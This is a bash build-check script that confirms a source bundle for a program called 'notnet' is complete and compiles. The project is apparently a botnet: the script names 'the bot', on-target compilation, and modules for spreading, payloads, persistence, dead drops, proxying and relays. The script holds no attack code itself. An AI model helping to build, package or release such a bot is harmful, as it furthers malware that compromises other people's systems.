#!/usr/bin/env bash
# verify_dist_src.sh — regression gate for `make dist-src` (#138 / #133)
#
# The on-target compilation source bundle MUST contain every .c/.h the bot
# references, AND those sources must compile. #133 shipped a bundle missing
# src/killswitch.c + include/killswitch.h — the on-target build silently
# failed. This gate catches that class of gap before release.
#
# Exits non-zero on any missing file or compile failure.
set -euo pipefail

cd "$(dirname "$0")/.."

echo "[verify_dist_src] building dist-src bundle..."
make clean >/dev/null 2>&1 || true
make dist-src >/dev/null

BUNDLE="dist/notnet-src.tar"
if [ ! -f "$BUNDLE" ]; then
    echo "FAIL: $BUNDLE not produced by 'make dist-src'"
    exit 1
fi

# Files the bot actually references (grep of #include + SRCS).
# Every one must be present in the tarball.
REQUIRED=$(cat <<'EOF'
notnet.c
src/protocol.c
src/spread.c
src/payload.c
src/persist.c
src/util.c
src/deaddrop.c
src/proxy.c
src/relay.c
src/plugin.c
src/killswitch.c
include/config.h
include/protocol.h
include/spread.h
include/payload.h
include/persist.h
include/util.h
include/deaddrop.h
include/proxy.h
include/relay.h
include/plugin.h
include/killswitch.h
Makefile
EOF
)

echo "[verify_dist_src] checking bundle contents..."
fail=0
while IFS= read -r f; do
    [ -z "$f" ] && continue
    if tar tf "$BUNDLE" | grep -qx "$f"; then
        :
    else
        echo "FAIL: required file missing from bundle: $f"
        fail=1
    fi
done <<< "$REQUIRED"

if [ "$fail" -ne 0 ]; then
    exit 1
fi

# Compile every bundled .c (the real on-target prerequisite).
echo "[verify_dist_src] extracting + compiling bundle sources..."
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
tar xf "$BUNDLE" -C "$TMP"

# Use host gcc; prefer -shared/-fPIC object compile (no static libc needed)
# so the gate runs on CI hosts without glibc static libs.
( cd "$TMP" && gcc -fPIC -c notnet.c src/*.c -I include 2>err.log ) \
    && echo "[verify_dist_src] all bundle sources compiled cleanly" \
    || { echo "FAIL: bundle sources did not compile:"; cat "$TMP/err.log"; exit 1; }

echo "[verify_dist_src] PASS"
